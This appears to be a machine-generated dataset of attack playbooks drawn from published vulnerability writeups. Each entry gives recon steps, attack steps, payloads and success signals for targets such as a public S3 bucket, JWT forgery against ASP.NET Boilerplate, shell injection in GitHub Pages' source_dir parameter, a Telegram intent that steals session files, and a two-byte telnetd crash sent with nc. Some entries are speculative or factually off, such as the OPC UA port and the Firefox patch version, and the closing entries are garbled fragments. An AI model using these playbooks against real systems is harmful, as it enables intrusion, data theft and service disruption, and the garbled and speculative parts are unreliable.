recon_steps: Step 1: Emulate the GameBoy Colour with Mobile Adapter GB using BGB emulator and analyze the Mobile Adapter GB protocol commands (reference Shonumi's site and Háčky's work).
Step 2: Replicate or adapt Háčky's Python script to interact with the Mobile Adapter GB protocol for sending and receiving data.
attack_steps: Step 1: Craft malformed data packets targeting specific commands within the Mobile Adapter GB protocol. The writeup implies a vulnerability in how certain data is handled, possibly buffer overflows or command injection.
Step 2: Send these crafted packets to the GameBoy Colour via the emulated network connection.
Step 3: Observe the behavior of the GameBoy Colour and Pokemon Crystal for crashes or unexpected execution flow.
Step 4: If a crash or unexpected behavior occurs, attempt to hijack execution by carefully controlling the crafted payload to overwrite return addresses or inject shellcode.
payloads_or_patterns: The writeup doesn't provide specific exploit payloads but mentions crafting malformed data packets. A potential area to explore would be commands that process user-provided data, such as those related to email or web browsing features of the Mobile Trainer GB.
tools_recommended: BGB emulator for GameBoy Colour emulation and debugging.
Custom Python script to interact with the Mobile Adapter GB protocol.
Network traffic analysis tools (if not using an emulator with built-in analysis).
success_indicators: The GameBoy Colour crashes unexpectedly.
Unexpected code execution is observed on the GameBoy Colour (e.g., displaying custom data, executing injected instructions).
failure_indicators: The GameBoy Colour or Mobile Adapter GB does not crash or exhibit unexpected behavior after sending crafted packets.
The Mobile Adapter GB protocol commands are not vulnerable to the crafted packets.

playbooks.impact: Remote Code Execution on a GameBoy Colour, allowing an attacker to potentially control the device or execute arbitrary code within the game's context.
playbooks.key_lesson: Investigate legacy network protocols for forgotten vulnerabilities, especially on older hardware and accessories where security was less of a primary concern.

meta.title: Zimbra Open Bucket Data Leak – Responsible Disclosure

trigger_conditions.when_to_apply: When a target is suspected of misconfiguring AWS S3 buckets, especially those serving public content or backups.
prerequisites: The target utilizes AWS S3 for data storage.
applicability_signals: Presence of a publicly accessible S3 bucket URL (e.g., https://<bucket-name>.s3.amazonaws.com/ or https://<bucket-name>.s3.<region>.amazonaws.com/)
The ability to access files within the bucket via a web browser without authentication.
skip_if: S3 bucket access is restricted with an 'Access Denied' error for all unauthenticated requests.

recon_steps: Attempt to access known S3 bucket URLs for the target (e.g., https://files.zimbra.com/)
Observe the HTTP response when accessing the S3 bucket URL. A successful listing of objects indicates a public bucket.
attack_steps: Access the publicly exposed S3 bucket URL in a web browser.
Browse through the listed files to identify potentially sensitive data such as backups, logs, user data, or configuration files.
Download files of interest to confirm their contents.
tools_recommended: Web Browser: For direct access and browsing of the S3 bucket content.
curl: For programmatic access and testing of S3 bucket URLs.
success_indicators: A listing of files is returned instead of an 'Access Denied' error.
Downloadable files contain sensitive information like user data, emails, passwords, configurations, or system logs.
The bucket contains backup data, company documents, or user logs that are not intended for public access.
failure_indicators: Receiving an 'Access Denied' error for all attempted URLs, indicating the bucket is private.
The bucket lists files but they are all empty or contain no sensitive information.

playbooks.impact: Exposure of sensitive data including server backups, company documents, user logs, emails, passwords, configurations, and archives to unauthorized individuals. This could lead to further compromise, data breaches, or reputational damage.
playbooks.key_lesson: Always verify AWS S3 bucket permissions to ensure that sensitive data is not publicly accessible, even for content intended to be shared externally.

meta.title: Break the Logic: 5 Different Perspectives in Single Page

affected_components: Contact information editing on student profiles (as parent user)
Address editing on student profiles (as parent user)
Contact field creation on student profiles (as parent user)
Address type modification on student profiles (as parent user)

trigger_conditions.when_to_apply: When an authenticated parent user can access a student's profile and observe editable fields, even if client-side restrictions prevent modification.
prerequisites: Attacker must have an authenticated parent user account.
Attacker must be able to view a student's profile.
applicability_signals: Edit button is present on the student profile page.
Address/contact fields appear editable but are disabled by client-side JavaScript.
Save button remains active despite disabled fields.
PUT requests are made to update contact or address information.
Request parameters contain IDs related to contact fields or addresses.
skip_if: All fields are completely disabled and the save button is inactive.
Server-side validation prevents any modification of another user's data regardless of client-side manipulation.

recon_steps: Step 1: Log in as an authenticated parent user.
Step 2: Navigate to a student's profile page.
Step 3: Observe the address and contact information sections. Identify fields that appear editable but are disabled via client-side attributes.
Step 4: Check if the 'Save' button remains active.
Step 5: Use browser developer tools to inspect the DOM and identify disabled attributes on input fields.
Step 6: Capture the HTTP request made when attempting to save changes (even if unsuccessful due to client-side checks).
attack_steps: Step 1: With the student's profile page open, use browser developer tools to remove the 'disabled' attribute from input fields in the address section.
Step 2: Fill in the address fields with desired values.
Step 3: Click the 'Save' button. Capture the outgoing PUT request.
Step 4: For contact information, identify the PUT request that updates contact details. Observe parameters related to IDs.
Step 5: Modify the ID values in the PUT request parameters (except learnerPersonalId) to attempt creating new contact fields or overwriting existing ones.
Step 6: For address types, identify the PUT request for editing an address. Modify the 'postalTitle' parameter (e.g., from 'residential' to 'official').
Step 7: Send the modified requests and observe the server's response.
payloads_or_patterns: Removing 'disabled' attribute from HTML input fields.
Modifying address parameters (e.g., address fields, postalTitle) in a PUT request.
Modifying ID parameters in a PUT request for contact fields. Example: Change ID values like `contactId` or similar to random values to test for IDOR or resource creation.
tools_recommended: Browser Developer Tools: For DOM manipulation (removing attributes) and network request inspection.
Burp Suite: For intercepting, modifying, and replaying HTTP requests, especially PUT requests to parameters.
success_indicators: The modified address or contact information is successfully saved and displayed on the student's profile.
A new contact field is created on the student's profile after modifying IDs.
The address type is successfully changed (e.g., from residential to official).
failure_indicators: HTTP 403 Forbidden or 401 Unauthorized responses indicate server-side access control is in place.
HTTP 500 Internal Server Error might indicate issues with unexpected input or logic flaws.
No change in the displayed information on the student's profile.
If modifying IDs results in a 400 Bad Request, it might indicate a specific format is required for IDs, suggesting potential for enumeration.

playbooks.impact: Unauthorized modification of student profile information (address, contact details, address types), creation of new contact fields, and potentially unauthorized access to or manipulation of other users' data if the IDOR vulnerability extends to other resources.
playbooks.key_lesson: Always bypass client-side restrictions using an intercepting proxy and test server-side validation for all parameters, especially IDs and sensitive data fields, when performing modifications as a low-privileged user.

meta.title: ASP.NET Boilerplate Multiple Vulnerabilities

tech_stack_fingerprints: Server responds with JWTs for authentication

trigger_conditions.when_to_apply: When an ASP.NET Boilerplate instance is found to be using default or guessable JWT signing secrets, allowing for unauthenticated administrative access.
prerequisites: Target application is built using ASP.NET Boilerplate framework.
The JWT signing secret is not securely configured.
applicability_signals: The presence of `/api/TokenAuth/Authenticate` endpoint.
The project name is discoverable (e.g., from page title, footer, or unauthenticated API endpoints).
The default JWT secret format `PROJECTNAME_C421AAEE0D114E9C` is observed or inferred.
skip_if: The JWT `SecurityKey` in `appsettings.json` is a long, random string.
The application uses a different authentication mechanism not relying on JWTs signed by `SecurityKey`.

recon_steps: Step 1: Visit the target application's login page and observe the page title to identify the project name.
Step 2: Inspect the copyright footer for the project name.
Step 3: Attempt to access any unauthenticated API endpoints that might reveal the project name or configuration details.
attack_steps: Step 1: Construct the JWT signing secret by appending the constant suffix `_C421AAEE0D114E9C` to the discovered project name.

Step 2: Use a tool or script to generate a JWT token. The token should include claims for a user ID (e.g., '1' for the default admin) and set `iat`, `nbf` to 0 and `exp` to `2147483647` (INT_MAX). The `iss` and `aud` claims should match the project name.
Step 3: Sign the generated JWT token using the constructed secret and the HS256 signing method.

Step 4: Send a request to the `/api/TokenAuth/Authenticate` endpoint (or a similar endpoint used for token validation if discoverable) with the forged JWT token in the Authorization header (e.g., `Authorization: Bearer <forged_token>`).
Step 5: After successfully authenticating with the forged token, send a request to an administrative endpoint (e.g., to create a new admin user).
tools_recommended: Golang script (as provided in the writeup) for JWT generation and signing
Burp Suite or similar proxy to intercept and modify requests, and to observe responses.
success_indicators: Receiving a valid JWT token from the `/api/TokenAuth/Authenticate` endpoint after sending a forged token.
Successful execution of administrative actions after authenticating with the forged token (e.g., creation of a new admin user).
failure_indicators: Receiving a 401 Unauthorized or similar error when sending the forged token, indicating the secret is incorrect or the token structure is invalid.
Receiving a 400 Bad Request indicating malformed token. Pivot: Double-check the project name extraction and JWT construction, ensure correct signing method (HS256).

playbooks.impact: An unauthenticated attacker can forge JWT tokens to gain unauthorized administrative access to the ASP.NET Boilerplate application, allowing them to perform any administrative action, including creating new administrator accounts.
playbooks.key_lesson: Always ensure JWT signing secrets are strong, random, and not derivable from easily discoverable information such as the project name.

meta.title: Command Injection in the GitHub Pages Build Pipeline

affected_components: GitHub Actions for GitHub Pages build process
target_profile.required_access_level: any_authenticated_user (with write access to a repository)
tech_stack_fingerprints: Presence of GitHub Pages functionality for a repository
Presence of Jekyll in repository dependencies or configuration

trigger_conditions.when_to_apply: When a repository has GitHub Pages enabled and the user can access the Theme Chooser settings to select a Jekyll theme.
prerequisites: Attacker must have write access to a GitHub repository.
Repository must have GitHub Pages enabled.
Repository must be configured to use Jekyll or a compatible static site generator.
applicability_signals: The GitHub Pages settings page for a repository displays a 'Theme Chooser' section.
The POST request to update the theme includes `source_dir` and `source` parameters.
The GitHub Actions pipeline for GitHub Pages involves `actions/checkout` and `actions/jekyll-build-pages`.
skip_if: Repository does not have GitHub Pages enabled.
Repository is not configured to use Jekyll or a compatible generator.
The `source_dir` parameter is strictly validated and does not allow shell metacharacters.

recon_steps: Step 1: Navigate to the GitHub Pages settings for a target repository.
Step 2: Observe the 'Theme Chooser' section and note the URL used when initiating theme selection (e.g., `https://github.com/<owner>/<repo>/settings/pages/themes?select=&source=main&source_dir=/`).
attack_steps: Step 1: Modify the `source_dir` parameter in the theme selection URL to include shell metacharacters. For example, `source_dir=/; ls -la; #` or `source_dir=/$(whoami)`. The exact payload depends on the desired command and the shell context within the GitHub Actions runner.
Step 2: Submit the POST request to update the Jekyll theme with the crafted `source_dir` value.
Step 3: Trigger a new GitHub Pages build by committing the theme change (GitHub Pages does this automatically upon theme update).
Step 4: Monitor the GitHub Actions build logs for the repository to observe the output of the injected command. The `actions/jekyll-build-pages@v1` step is where the shell command will be executed.
Step 5: If the command executed successfully, examine the build logs for the output of the command (e.g., file listings, user information).
tools_recommended: Burp Suite: To intercept and modify the POST request to `/owner/repo/settings/pages/theme`.
Browser Developer Tools: To inspect network requests and responses.
success_indicators: Output of the injected command appearing in the GitHub Actions build logs. For example, the output of `ls -la` or `whoami`.
The `tar` command in the `actions/upload-pages-artifact@v0` step producing unexpected or malformed output if the injected command disrupts its execution.
failure_indicators: The GitHub Pages build failing with an error related to directory creation or file processing without showing command output (suggests input sanitization or insufficient privileges).
The `source_dir` being normalized or sanitized, preventing the injection of shell metacharacters.

playbooks.impact: Remote Code Execution (RCE) within the GitHub Actions runner environment used for building GitHub Pages. This could allow an attacker to read sensitive files, exfiltrate data, pivot to other systems within the runner's network, or disrupt the build process.
playbooks.key_lesson: Always sanitize user-controlled input used in shell commands, especially in automated CI/CD pipelines where the execution context may be broad.

meta.title: Chaining Telegram bugs to steal session-related files

tech_stack_fingerprints: Content Provider URIs with custom schemes (content://org.telegram.messenger...)

trigger_conditions.when_to_apply: When an Android application can share arbitrary files or data to the Telegram app, and Telegram's sharing mechanism doesn't properly validate URIs or handles direct share intents insecurely.
prerequisites: Attacker controls a malicious Android application capable of initiating a share intent.
The target device has the Telegram Android application installed.
applicability_signals: Telegram's LaunchActivity has an intent filter that accepts `image/*`, `video/*`, `text/plain`, or `*/*` MIME types.
Telegram's sharing intent handling does not sufficiently validate URIs, specifically regarding internal file paths.
Telegram's direct share functionality (via `ChooserTargetService` extras) is implemented without proper validation of the target chat ID.
skip_if: Telegram's `isInternalUri` method is robust and correctly identifies and blocks all internal URIs.
The direct share intent is handled with strict validation of the `dialogId` extra to ensure it's a legitimate user-initiated action.

recon_steps: Step 1: Analyze the intent filters of the Telegram Android application's main sharing activity to identify accepted MIME types and data schemes.
Step 2: Investigate how the Telegram app handles incoming URIs from share intents, specifically looking for methods that open `InputStream` or copy files from URIs.
Step 3: Identify any Content Providers exposed by the Telegram app that might allow access to internal files, paying attention to their URIs and parameters.
Step 4: Analyze the implementation of Telegram's direct share feature (ChooserTargetService) to understand how target chat IDs are handled and if they are validated.
attack_steps: Step 1: Craft a malicious Android application that initiates a share intent with a crafted content URI pointing to an internal Telegram file via a custom Content Provider. Example URI: `content://org.telegram.messenger.notification_image_provider/msg_media_raw/1/test.txt?final_path=/data/data/org.telegram.messenger/shared_prefs/userconfing.xml`
Step 2: Include an extra `dialogId` in the share intent with a target chat ID (e.g., `100000000`) to trigger the direct share functionality.
Step 3: Send the crafted share intent from the malicious application to the Telegram app.
Step 4: Observe the Telegram app's behavior to confirm if the internal file is sent directly to the specified chat without user interaction.
payloads_or_patterns:
Intent Action: android.intent.action.SEND
Intent Categories: android.intent.category.DEFAULT
Intent MIME Type: */*
Intent Extras:
  - 'android.intent.extra.STREAM': Uri: content://org.telegram.messenger.notification_image_provider/msg_media_raw/1/test.txt?final_path=/data/data/org.telegram.messenger/shared_prefs/userconfing.xml
  - 'dialogId': <TARGET_CHAT_ID>
tools_recommended: Android Debug Bridge (adb) for installing malicious apps and observing logs.
Android reverse engineering tools (e.g., Jadx, Ghidra) to analyze Telegram's codebase.
Custom Android application development environment (Android Studio) to craft the exploit.
success_indicators: The Telegram application sends the specified internal file (e.g., `userconfing.xml`) to the target chat ID without any user intervention or confirmation prompt.
A toast message like 'Unsupported content' is *not* displayed, indicating the URI bypass was successful.
failure_indicators: The Telegram app displays an 'Unsupported content' toast, indicating the `isInternalUri` check is blocking the exploit.
The file is not sent, or a user interaction prompt is still displayed, indicating the direct share intent is not properly handled.
400 Bad Request or similar error codes if the intent extras are malformed.

playbooks.impact: An attacker can steal sensitive internal files from the Telegram application, including session-related files, user configurations, and potentially authentication tokens, by chaining two vulnerabilities: improper URI validation of shared content and insecure handling of direct share intents.
playbooks.key_lesson: Always validate the source and integrity of URIs provided through intents, especially when accessing internal application files, and ensure that direct share functionalities are protected against unauthorized or unintended data exfiltration.

meta.title: SATisfying our way into remote code execution in the OPC UA industrial stack

trigger_conditions.when_to_apply: This vulnerability is applicable when an attacker can send malformed data to the Unified Automation OPC UA Server, specifically targeting the parsing of malformed type arrays.
prerequisites: Attacker can establish a connection to the OPC UA server.
applicability_signals: Target is running a Unified Automation OPC UA server.
The server is reachable over the network.
skip_if: The OPC UA server is configured to strictly validate all incoming data types and structures.
A Web Application Firewall (WAF) or network intrusion detection system is blocking malformed OPC UA packets.

recon_steps: Step 1: Identify active OPC UA servers on the target network using port scanning (default OPC UA port is 49320).
Step 2: Banner grab or inspect OPC UA protocol handshake to confirm it's a Unified Automation product.
attack_steps: Step 1: Craft a malformed OPC UA GetTypeArray request. The malformation involves sending an incorrect size for the type array, leading to an out-of-bounds read.
Step 2: Send the malformed GetTypeArray request to the OPC UA server.
Step 3: Observe the server's response or crash behavior to confirm exploitation.
payloads_or_patterns: A specially crafted OPC UA GetTypeArray request with an invalid `TypeArrayLength` value.
tools_recommended: Custom Python script using an OPC UA library (e.g., `asyncua`) to craft and send malformed requests.
Wireshark to capture and analyze OPC UA traffic.
success_indicators: The OPC UA server crashes or becomes unresponsive.
Memory corruption indicators in server logs.
If a shell is achieved, a shell prompt or successful command execution will be observed.
failure_indicators: Server returns a valid OPC UA error code indicating invalid data structure.
Server continues to operate normally without crashes or errors.

playbooks.impact: Remote Code Execution (RCE) on the target system running the Unified Automation OPC UA Server, allowing an attacker to execute arbitrary commands with the privileges of the server process.
playbooks.key_lesson: Always fuzz industrial protocol parsers, especially for size-related fields in data structures, as they are common sources of memory corruption vulnerabilities.

meta.title: 2-byte DoS in freebsd-telnetd / netbsd-telnetd / netkit-telnetd / inetutils-telnetd / telnetd in Kerberos Version 5 Applications

trigger_conditions.when_to_apply: When a telnet service is detected running on the target, and the specific implementation is known or suspected to be one of the vulnerable versions.
prerequisites: Target machine is running a telnet server on port 23.
applicability_signals: Successful connection to port 23.
Banner indicating a telnet service.
skip_if: Target port 23 is closed or filtered.
Telnet service is not running.

recon_steps: Step 1: Scan target IP addresses for open TCP port 23 to identify potential telnet services.
Step 2: Attempt to connect to port 23 to verify if it's a telnet service and observe the banner.
attack_steps: Step 1: Connect to the target IP on port 23 using netcat.
Step 2: Send the 2-byte payload "\xff\xf7" to the telnetd service.
Step 3: Observe the target system's behavior for signs of a crash or service interruption.
tools_recommended: netcat: Used to establish a TCP connection and send the payload (e.g., printf "\xff\xf7" | nc -n -v <TARGET_IP> 23)
success_indicators: The telnetd service crashes.
The target system logs a segmentation fault or similar error related to the telnetd process (e.g., "pid X (telnetd), jid Y, uid Z: exited on signal 11 (core dumped)" in dmesg).
Loss of connectivity to the telnet service on port 23.
failure_indicators: No visible change in the telnet service status.
The service responds normally after receiving the payload.
A WAF or IPS blocks the payload (though unlikely for this simple payload on an unencrypted protocol).

playbooks.impact: Denial of Service (DoS) of the telnet service, preventing legitimate users from connecting and potentially causing instability on older systems.
playbooks.key_lesson: Always test for simple, unauthenticated denial-of-service vulnerabilities on legacy network services like telnet, as they may still be present and exploitable with minimal effort.

meta.title: But You Told Me You Were Safe: Attacking The Mozilla Firefox Renderer (Part 1)

tech_stack_fingerprints: Runs JavaScript in the browser renderer process

trigger_conditions.when_to_apply: When a web application can execute JavaScript within the context of the Mozilla Firefox browser's renderer process, and specifically when features related to asynchronous modules or top-level await are being processed by the browser's internal JavaScript engine.
prerequisites: The target environment must be Mozilla Firefox.
The vulnerable code path within SpiderMonkey's JavaScript engine related to `await` implementation must be accessible.
applicability_signals: The presence of JavaScript code that interacts with the `Array.prototype.push` method in a way that can be influenced by user-controlled input.
The JavaScript engine's handling of asynchronous modules or top-level await features.
skip_if: The Firefox version is patched (e.g., prior to 100.0.2).

recon_steps: Step 1: Identify if the target environment is Mozilla Firefox.

Step 2: (Passive) Analyze JavaScript code for patterns that utilize `Array.prototype.push` on objects that might have prototypes controlled by user input, especially within asynchronous operations or module loading.
attack_steps: Step 1: Craft JavaScript code that manipulates `Array.prototype` by defining a setter for a property (e.g., property '0').
Step 2: Trigger the vulnerable `await` implementation within SpiderMonkey's built-in JavaScript code, likely by using asynchronous module loading or top-level await features.
Step 3: Observe if the setter on `Array.prototype` is invoked, leading to the creation of a `Module` object which is not intended to be accessible to untrusted scripts.
Step 4: Interact with the exposed `Module` object's prototype (e.g., call `GatherAsyncParentCompletions`) to trigger methods like `UnsafeSetReservedSlot`, aiming for memory corruption.
tools_recommended: Browser Developer Tools: To debug JavaScript execution and observe prototype chain manipulation.
Custom JavaScript exploit scripts: To precisely craft the payload and trigger the vulnerable code path.
success_indicators: Execution of the `set` function defined on `Array.prototype`.
The creation and access of the internal `Module` object (`m`).
Observable memory corruption or crash in the Firefox renderer process.
failure_indicators: No execution of the `set` function when the `await` is triggered (e.g., due to browser patching or incorrect exploit logic).
The `Module` object is not created or not accessible.
No signs of memory corruption or crashes.

playbooks.impact: Remote Code Execution (RCE) within the Mozilla Firefox renderer process. This can lead to full compromise of the user's system if chained with further exploits.
playbooks.key_lesson: Be aware that JavaScript code within browser engines, even when written in memory-safe languages, can be vulnerable to prototype pollution if not carefully handled, potentially leading to severe security issues like RCE.

meta.title: But You Told Me You Were Safe: Attacking The Mozilla Firefox Sandbox (Part 2)

trigger_conditions.when_to_apply: When a prototype pollution vulnerability exists in JavaScript code that runs in the parent (chrome) process and can be triggered by messages from a compromised renderer process.
prerequisites: Compromised renderer process with native code execution (as described in Part 1 of the writeup).
Existence of a communication channel from the renderer to the parent process that accepts structured clone algorithm data.
A vulnerability allowing modification of `origin` or `notification.id` in the 'Notification:Save' message processing within the parent process.
applicability_signals: Observation of the `NotificationDB.jsm` module and its `taskSave` function in the parent process.
The `taskSave` function directly uses data from incoming messages for `origin` and `notification.id` without proper validation.
The ability to send structured clone algorithm-compatible data from the renderer to the parent process.
skip_if: The target JavaScript environment sanitizes or validates all incoming message data for `origin` and `notification.id`.
No reliable communication channel exists between the compromised renderer and the parent process for sending structured clone data.

recon_steps: Step 1: Analyze the source code of the Firefox parent process (chrome process) to identify JavaScript modules that process messages from the renderer.
Step 2: Specifically examine modules like `NotificationDB.jsm` for functions that handle message data, paying attention to how parameters like 'origin' and 'notification.id' are used.
attack_steps: Step 1: Execute attacker-controlled JavaScript in the compromised renderer process to establish a privileged JavaScript context in the parent process (e.g., by marking the compartment as system and patching `CanCreateWrapper`).
Step 2: Craft a 'Notification:Save' message with the `origin` field set to the string "__proto__".
Step 3: Set the `notification.id` property to the desired property name that will be polluted on `Object.prototype` (e.g., a value that will enable a specific exploit gadget during tab restoration).
Step 4: Send this crafted message from the renderer process to the parent process.
Step 5: Trigger a mechanism that utilizes the polluted `Object.prototype`, such as tab restoration, to achieve arbitrary JavaScript execution in the parent process.
tools_recommended: Custom JavaScript exploit development environment for Firefox renderer and parent process.
Debugger for Firefox internal JavaScript components (e.g., `jsdb`).
success_indicators: Attacker-controlled JavaScript code executes in the parent process (outside the sandbox).
Observable changes in browser behavior indicative of post-sandbox escape actions (e.g., native code execution, arbitrary file access, network requests from parent process).
failure_indicators: The 'Notification:Save' message processing does not result in prototype pollution (e.g., validation is present). Pivot to investigating other message handlers.
The prototype pollution does not lead to exploitable JavaScript execution in the parent process. Investigate other gadgets or exploit primitives.

playbooks.impact: Allows an attacker to execute arbitrary JavaScript code in the privileged parent process of Mozilla Firefox, escaping the renderer sandbox. This can lead to native code execution, potentially compromising the entire system.
playbooks.key_lesson: When a renderer process can communicate with a privileged parent process via message passing, carefully examine all message handlers in the parent process for prototype pollution vulnerabilities by sending structured clone-compatible data with special property names like '__proto__'.

meta.title: Break Me Out Of Sandbox In Old Pipe - CVE-2022-22715 Windows Dirty Pipe

prerequisites: Attacker must be able to execute code or create named pipes on the target Windows system.
The target system must be vulnerable to CVE-2022-22715 (i.e., not patched).

The ability to interact with named pipes.
skip_if: Target system has the CVE-2022-22715 patch applied.
The environment does not allow for the creation of named pipes.

recon_steps: Step 1: Identify the version of Windows and check for the presence of the npfs.sys driver.
Step 2: Determine if the system is running applications that use AppContainer and rely on named pipes for inter-process communication.
attack_steps: Step 1: Create a malicious named pipe with a name prefixed by 'LOCAL\', e.g., '\\.\pipe\LOCAL\malicious_pipe'.
Step 2: Leverage the vulnerability in NpTranslateContainerLocalAlias within npfs.sys to bypass sandbox restrictions.
Step 3: Write to a protected memory location or file that would normally be inaccessible from the sandbox.
Step 4: Achieve privilege escalation by overwriting critical system structures or gaining control of a higher-privileged process.
tools_recommended: Custom exploit code in C/C++ for interacting with Windows named pipes and kernel drivers.
Debuggers like WinDbg for kernel debugging if source code is unavailable.
success_indicators: Successful overwriting of a target file or memory location with attacker-controlled data.
Execution of arbitrary code with elevated privileges.
System instability or crash (if the exploit is unstable).
failure_indicators: Named pipe creation fails with an access denied error.
The system does not exhibit the expected behavior after attempting the exploit (e.g., no privilege escalation).
403 Forbidden or similar errors if file system access is attempted without proper permissions.

playbooks.impact: Local privilege escalation from a sandboxed environment (e.g., AppContainer) to SYSTEM privileges, allowing the attacker to compromise the entire host.
playbooks.key_lesson: Always investigate named pipe creation and handling in Windows kernel drivers, especially when dealing with sandboxed processes, as improper alias translation can lead to privilege escalation.

Access to administrative functions or sensitive data within the Introscope Enterprise Manager.

meta.title: Vulnerability in Linux containers – investigation and mitigation

target_profile.technology: Linux Containers (Docker, Kubernetes, runc, crun, Kata Containers)
affected_components: Linux access control permissions (specifically negative group permissions)
tech_stack_fingerprints: Presence of container runtimes like Docker, Podman, Kubernetes

The target system utilizes the 'negative group permissions' feature for access control.

The writeup states the vulnerability affects a feature of Linux access control permissions that is 'not widely used – negative group permissions'.

The target system does not use the 'negative group permissions' feature.

Step 2: Investigate if the system configuration uses 'negative group permissions' for file access control. This may involve checking system configuration files related to groups and permissions.

Step 2: Attempt to exploit the vulnerability related to negative group permissions to access files or perform actions outside the intended container isolation.

Linux command-line tools for file system and permission analysis (e.g., `ls -l`, `getfacl`)
success_indicators: Ability to read/write files outside the container's expected scope.
Successful execution of commands with elevated privileges on the host system or other containers.

No observable change in access capabilities (suggests the exploit is not effective).
